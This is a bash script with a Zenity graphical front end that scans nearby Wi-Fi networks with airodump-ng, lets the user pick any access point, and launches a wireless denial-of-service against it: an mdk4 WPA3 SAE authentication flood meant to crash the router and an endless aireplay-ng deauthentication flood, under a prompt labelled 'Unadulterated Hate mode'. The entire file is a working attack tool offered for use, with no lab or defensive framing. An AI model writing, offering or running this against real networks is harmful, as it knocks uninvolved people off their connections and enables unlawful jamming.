#!/bin/bash

# --- Check for Zenity ---
if ! command -v zenity &> /dev/null; then
    echo "Installing zenity for GUI..."
    sudo apt update && sudo apt install zenity -y
fi

# --- 1. Select Interfaces ---
INT1=$(zenity --list --title="Select Card 1 (The Jammer)" --column="Interfaces" $(ls /sys/class/net))
INT2=$(zenity --list --title="Select Card 2 (The Sniffer)" --column="Interfaces" $(ls /sys/class/net))

[ -z "$INT1" ] || [ -z "$INT2" ] && exit

# --- 2. Scanner Mode ---
# We launch a temporary scan to a file so we can pick the target
zenity --info --text="Scanning for 1 minute. Press OK to start. Close the terminal window when you see your target." --width=300
xterm -geometry 100x24 -e "airodump-ng $INT2 -w /tmp/scan --output-format csv" &
SCAN_PID=$!
sleep 30 # Let it scan for 30 seconds
kill $SCAN_PID

# --- 3. GUI Selection ---
# Parse the CSV to show a list of BSSIDs and SSIDs
TARGET_DATA=$(awk -F, 'NR>2 {print $1 " " $14}' /tmp/scan-01.csv | zenity --list --title="Select Target BSSID" --column="BSSID" --column="SSID" --width=500 --height=400)
BSSID=$(echo $TARGET_DATA | awk '{print $1}')
CH=$(grep "$BSSID" /tmp/scan-01.csv | awk -F, '{print $4}' | tr -d ' ')

if [ -z "$BSSID" ]; then
    zenity --error --text="No target selected. Exiting."
    exit
fi

# --- 4. Launch The Attack (The Shabang) ---
# Card 1: SAE Auth Flood (Crashing WPA3 logic)
# Card 2: Deauth/Beacon Flood (WPA2 interference)

zenity --question --text="Target: $BSSID on Channel $CH. Launch Unadulterated Hate mode?" --ok-label="SHABANG"

if [ $? -eq 0 ]; then
    # Set channels
    iw dev $INT1 set channel $CH
    iw dev $INT2 set channel $CH

    # Window 1: SAE Flooding (The CPU Crusher)
    xterm -T "WPA3 SAE FLOOD" -e "mdk4 $INT1 a -a $BSSID -m -s 1000" &
    
    # Window 2: Deauth Flood (The Disconnector)
    xterm -T "WPA2 DEAUTH" -e "aireplay-ng --deauth 0 -a $BSSID $INT2" &

    # Window 3: Monitor the Crash
    xterm -T "MONITORING" -e "airodump-ng --bssid $BSSID --channel $CH $INT2" &
    
    zenity --info --text="Attacks running in separate windows. Close them to stop."
fi

# Cleanup
rm /tmp/scan-01.csv

